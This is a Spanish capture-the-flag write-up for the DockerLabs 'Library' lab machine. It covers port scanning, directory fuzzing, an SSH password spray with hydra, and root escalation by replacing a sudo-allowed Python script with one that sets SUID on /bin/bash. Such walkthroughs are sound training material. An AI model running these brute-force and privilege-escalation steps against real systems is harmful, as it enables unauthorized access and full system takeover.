---
icon: flag
---

# Library DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip library.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh library.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 12:06 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds
```

Si entramos en la `web` veremos poca cosa, ya que es un `apache2` normal, por lo que haremos un poco de `fuzzing` para ver que encontramos:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 26]
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un `index.php` que si entramos dentro veremos una web que pone en grande la siguiente palabra:

```
JIFGHDS87GYDFIGD
```

Por lo que podemos deducir que puede ser las credenciales de algun usuario del sistema, por lo que vamos a realizar un ataque de fuerza bruta con una lista de usuarios con `hydra`:

## Escalate user carlos

### Hydra

```shell
hydra -L <WORDLIST> -p JIFGHDS87GYDFIGD ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-17 12:23:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 624370 login tries (l:624370/p:1), ~9756 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Vemos que nos saca las credenciales de un usuario, por lo que nos conectaremos a el mediante `ssh`:

### SSH

```shell
ssh carlos@<IP>
```

Metemos como contraseña `JIFGHDS87GYDFIGD` y veremos que estamos dentro con dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for carlos on 2f110a30d52f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User carlos may run the following commands on 2f110a30d52f:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

Vemos que podemos ejecutar el script `/opt/script.py` como el usuario `root` por lo que haremos lo siguiente:

```shell
ls -la /opt/
```

Si listamos para ver que permisos tiene, vemos lo siguiente:

```
total 12
drwxr-xr-x 1 carlos root 4096 May  7  2024 .
drwxr-xr-x 1 root   root 4096 Jan 17 17:05 ..
-r-xr--r-- 1 carlos root  272 May  7  2024 script.py
```

Vemos que nosotros somos el propietario del script, por lo que podremos hacer lo siguiente:

```shell
rm /opt/script.py
```

Y creamos un script llamado de la misma forma:

```shell
nano /opt/script.py

#Dentro del nano
import os
import stat

# Ruta del binario al que quieres asignar SUID
binary_path = "/bin/bash"

def set_suid(binary):
    try:
        # Obtener los permisos actuales del archivo
        current_permissions = os.stat(binary).st_mode

        # Añadir el bit SUID a los permisos
        new_permissions = current_permissions | stat.S_ISUID

        # Cambiar los permisos del archivo
        os.chmod(binary, new_permissions)

        print(f"Permisos SUID asignados correctamente a {binary}.")
    except PermissionError:
        print("Error: Se necesitan privilegios de superusuario para ejecutar este script.")
    except FileNotFoundError:
        print(f"Error: El archivo {binary} no se encontró.")
    except Exception as e:
        print(f"Error inesperado: {e}")

# Ejecutar la función
set_suid(binary_path)
```

Lo guardamos y haremos lo siguiente:

```shell
sudo python3 /opt/script.py
```

Info:

```
Permisos SUID asignados correctamente a /bin/bash.
```

Ahora si listamos la `bash`:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que ha funcionado, por lo que solo tendremos que hacer lo siguiente:

```shell
bash -p
```

Con esto ya seremos `root`, por lo que habremos terminado la maquina.
